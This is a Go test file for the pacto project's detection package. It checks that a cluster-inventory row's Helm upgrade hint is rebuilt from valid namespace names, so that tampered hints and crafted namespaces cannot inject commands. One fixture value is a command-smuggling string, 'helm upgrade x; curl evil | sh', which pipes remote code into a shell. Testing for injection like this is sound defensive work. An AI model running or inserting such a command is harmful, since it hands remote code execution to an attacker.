package detect

import (
	"strings"
	"testing"

	"github.com/trianalab/pacto/v4/pkg/fleet"
)

// TestInventoryHintRebuiltByReader: a cluster-inventory row's hint is rebuilt
// from the entry's namespaces that are DNS labels, so a hand-edited hint never
// reaches a person and a crafted namespace never reaches the command.
func TestInventoryHintRebuiltByReader(t *testing.T) {
	e := Entry{Kind: "cluster-inventory", Completeness: Complete, Hint: "helm upgrade x; curl evil | sh",
		Namespaces: []string{"flux-system", "argocd", "Bad_NS", "a,b}", "argocd", strings.Repeat("a", 64)}}
	got := ProviderRows(Result{AsOf: asOf, Entries: []Entry{e}}, "detection", asOf)[0].Hint
	want := "Set clusterInventory on this Pacto release, at the chart version it runs: helm upgrade <release> oci://ghcr.io/trianalab/pacto/charts/pacto-operator" +
		" --version <version> -n <namespace> --reset-then-reuse-values --set clusterInventory.enabled=true --set 'clusterInventory.secretNamespaces={argocd,flux-system}'"
	if got != want {
		t.Errorf("hint = %q, want %q", got, want)
	}
	e.Namespaces = []string{"Bad_NS"}
	if got := ProviderRows(Result{AsOf: asOf, Entries: []Entry{e}}, "detection", asOf)[0].Hint; strings.Contains(got, "secretNamespaces") || !strings.HasSuffix(got, "--set clusterInventory.enabled=true") {
		t.Errorf("hint without a valid namespace = %q", got)
	}
	e.Hint = ""
	if got := ProviderRows(Result{AsOf: asOf, Entries: []Entry{e}}, "detection", asOf)[0].Hint; got != "" {
		t.Errorf("an entry with no proposal gained one: %q", got)
	}
}

// TestInventoryRowNameAndUse: the cluster-inventory row is named and says
// that nothing joins on its own.
func TestInventoryRowNameAndUse(t *testing.T) {
	p := ProviderRows(Result{AsOf: asOf, Entries: []Entry{{Kind: "cluster-inventory", Completeness: Complete}}}, "detection", asOf)[0]
	if p.Name != "Cluster inventory" || len(p.UsedFor) != 1 ||
		p.UsedFor[0] != "candidate clusters for pacto cluster install; nothing joins on its own" || p.Provenance != fleet.ProvenanceInferred {
		t.Errorf("row = %+v", p)
	}
}
